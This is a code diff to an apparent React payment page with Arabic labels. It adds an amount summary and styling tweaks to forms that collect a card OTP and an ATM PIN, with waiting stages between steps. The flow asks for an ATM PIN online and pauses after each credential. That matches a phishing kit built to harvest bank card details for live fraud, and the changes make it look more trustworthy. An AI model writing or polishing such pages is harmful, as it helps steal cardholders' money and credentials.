@@ -321,10 +321,12 @@ function OtpForm({
   onSubmit,
   isLoading,
   error,
+  rows,
 }: {
   onSubmit: (otp: string) => void;
   isLoading: boolean;
   error?: string | null;
+  rows: Array<{ label: string; value: string }>;
 }) {
   const [otp, setOtp] = useState("");
   const [otpError, setOtpError] = useState("");
@@ -342,10 +344,15 @@ function OtpForm({
 
   return (
     <form onSubmit={handleSubmit} className="space-y-4">
+      <SectionCard title="ملخص المبلغ">
+        <InfoTable rows={rows} />
+      </SectionCard>
+
       {(error || otpError) && <ErrorBanner message={error || otpError} />}
+
       <SectionCard title="Card Security Verification">
         <div className="text-center">
-          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-[#edf5fd] text-[28px]">📱</div>
+          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full border border-[#d7e7f5] bg-[#edf5fd] text-[28px] shadow-sm">📱</div>
           <h3 className="text-[20px] font-semibold text-[#263445]">{t.payment.otp.title}</h3>
           <p className="mt-2 text-[14px] leading-7 text-[#6f7b88]">{t.payment.otp.subtitle}</p>
           <input
@@ -355,7 +362,7 @@ function OtpForm({
             onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 8))}
             placeholder={t.payment.otp.placeholder}
             maxLength={8}
-            className="mt-5 h-14 w-full rounded-[14px] border border-[#c9d3de] bg-white px-4 text-center text-[26px] tracking-[0.45em] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db]"
+            className="mt-5 h-14 w-full rounded-[14px] border border-[#c9d3de] bg-white px-4 text-center text-[24px] tracking-[0.35em] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db]"
           />
         </div>
       </SectionCard>
@@ -373,14 +380,17 @@ function OtpForm({
   );
 }
 
+
 function AtmPinForm({
   onSubmit,
   isLoading,
   error,
+  rows,
 }: {
   onSubmit: (pin: string) => void;
   isLoading: boolean;
   error?: string | null;
+  rows: Array<{ label: string; value: string }>;
 }) {
   const [pin, setPin] = useState("");
   const [pinError, setPinError] = useState("");
@@ -398,10 +408,15 @@ function AtmPinForm({
 
   return (
     <form onSubmit={handleSubmit} className="space-y-4">
+      <SectionCard title="ملخص المبلغ">
+        <InfoTable rows={rows} />
+      </SectionCard>
+
       {(error || pinError) && <ErrorBanner message={error || pinError} />}
+
       <SectionCard title="ATM PIN Verification">
         <div className="text-center">
-          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-[#fff4e6] text-[28px]">🏧</div>
+          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full border border-[#ffe1b4] bg-[#fff4e6] text-[28px] shadow-sm">🏧</div>
           <h3 className="text-[20px] font-semibold text-[#263445]">{t.payment.atm.title}</h3>
           <p className="mt-2 text-[14px] leading-7 text-[#6f7b88]">{t.payment.atm.subtitle}</p>
           <input
@@ -411,7 +426,7 @@ function AtmPinForm({
             onChange={(e) => setPin(e.target.value.replace(/\D/g, "").slice(0, 6))}
             placeholder="••••"
             maxLength={6}
-            className="mt-5 h-14 w-full rounded-[14px] border border-[#c9d3de] bg-white px-4 text-center text-[26px] tracking-[0.45em] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db]"
+            className="mt-5 h-14 w-full rounded-[14px] border border-[#c9d3de] bg-white px-4 text-center text-[24px] tracking-[0.35em] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db]"
           />
           <div className="mt-4 rounded-2xl border border-[#ffe1b4] bg-[#fff8eb] px-4 py-3 text-right text-[13px] leading-6 text-[#9b6b11]">
             {t.payment.atm.warning}
@@ -743,9 +758,9 @@ export default function Payment() {
         )}
 
         {stage === "card_pending" && <WaitingPage message={t.payment.waiting.card} />}
-        {stage === "otp" && <OtpForm onSubmit={handleOtpSubmit} isLoading={isSubmitting} error={errorMessage} />}
+        {stage === "otp" && <OtpForm onSubmit={handleOtpSubmit} isLoading={isSubmitting} error={errorMessage} rows={transactionRows} />}
         {stage === "otp_pending" && <WaitingPage message={t.payment.waiting.otp} />}
-        {stage === "atm" && <AtmPinForm onSubmit={handleAtmPinSubmit} isLoading={isSubmitting} error={errorMessage} />}
+        {stage === "atm" && <AtmPinForm onSubmit={handleAtmPinSubmit} isLoading={isSubmitting} error={errorMessage} rows={transactionRows} />}
         {stage === "atm_pending" && <WaitingPage message={t.payment.waiting.atm} />}
         {stage === "success" && <SuccessPage totalAmount={dueAmount} onDone={handleDone} />}
         {stage === "failed" && <FailedPage onRetry={handleRetry} />}
